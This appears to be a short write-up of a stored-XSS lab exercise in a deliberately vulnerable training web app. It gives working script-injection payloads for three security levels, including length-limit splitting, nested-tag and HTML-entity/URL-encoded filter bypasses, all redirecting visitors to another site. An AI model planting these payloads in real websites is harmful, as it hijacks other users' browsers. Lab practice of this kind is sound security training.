# XSS (Stored)

Objective

Redirect everyone to a web page of your choosing.

## low

"Message" parameter is restricted to 50 characters.  
To bypass this, we just need to split our code and POST them one by one.

```html
<script>z='window.location.replace'</script>
<script>z+='(\"http://www.baidu.com\")'</script>
<script>eval(z)</script>
```

> PHPSESSID=j4qh43u6j16jm4k8kp1ksjq5n3; security=low

## medium

"Message" gets nicely filtered by `strip_tags()` and addslashes, but
"Name" is not. We just need to bypass the length restriction and
`str_replace('<script>')`.

Sending POST data with curl or burpsuite to bypass frontend restriction of
string length.  
Here is the exp:  
```html
<scr<script>ipt>window.location.replace("http://www.baidu.com")</script>
```

> PHPSESSID=j4qh43u6j16jm4k8kp1ksjq5n3; security=medium

## high

Almost the same as medium but this time "Name" is filtered by
`preg_replace()`.  
Usage of `<script>` is limited by `preg_replace()`, but we can html-encode 
character 'p' to bypass.

```html
<img src="" onerror="javascript:window.location.replace('http://www.baidu.com')">
<img src="" onerror="javascri&#112;t:window.location.re&#112;lace('http://www.baidu.com')">
%3c%69%6d%67%20%73%72%63%3d%22%22%20%6f%6e%65%72%72%6f%72%3d%22%6a%61%76%61%73%63%72%26%23%31%31%32%3b%69%74%3a%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e%2e%72%65%26%23%31%31%32%3b%6c%61%63%65%28%27%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d%27%29%22%3e
```

> PHPSESSID=j4qh43u6j16jm4k8kp1ksjq5n3; security=high
